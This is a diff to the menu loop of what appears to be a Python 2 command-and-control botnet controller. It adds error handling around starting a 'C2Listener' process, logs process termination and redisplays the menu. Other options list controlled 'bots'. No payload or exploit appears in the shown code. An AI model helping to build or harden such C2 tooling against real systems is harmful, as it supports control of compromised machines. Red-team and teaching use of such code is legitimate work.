@@ -222,20 +222,26 @@ def main(argv):
 						#print "[D] Killing process: ", proc.name
 						proc.terminate()
 				print "[*] Starting new capture"
-				process = Process(name='C2Listener',target=c2main,args=(command,))
-				process.start()
-				if process.is_alive():
-					print "[*] C2 Listening - command: %s" % command.value
-				else:
-					print "[X] Error starting C2 listener"
+				try:
+					process = Process(name='C2Listener',target=c2main,args=(command,))
+					process.start()
+					if process.is_alive():
+						print "[*] C2 Listening - command: %s" % command.value
+					else:
+						print "[X] Error starting C2 listener"
+				except Exception, e:
+					print "[X] Error: " + str(e)
 			else:
 				print "[*] No listener currently running. Starting..."
-				process = Process(name='C2Listener',target=c2main,args=(command,))
-				process.start()
-				if process.is_alive():
-					print "[*] C2 Listening - command: %s" % command.value
-				else:
-					print "[X] Error starting C2 listener"
+				try:
+					process = Process(name='C2Listener',target=c2main,args=(command,))
+					process.start()
+					if process.is_alive():
+						print "[*] C2 Listening - command: %s" % command.value
+					else:
+						print "[X] Error starting C2 listener"
+				except Exception, e:
+					print "[X] Error: " + str(e)
 		elif option == '2':
 			print "[*] Displaying bots!"
 			displayBots()
@@ -256,10 +262,13 @@ def main(argv):
 			print "[D] Running Processes: ", active_children()
 		elif option == 'q':
 			for proc in active_children():
+				print "[*] Terminating process: " + str(proc.name)
 				proc.terminate()
+			print "[*] All processes terminated, exiting"
 			sys.exit()
 		else:
 			print "Invalid Option...please try again"
-
+		displayMenu()
+	
 if __name__ == "__main__":
    main(sys.argv[1:])
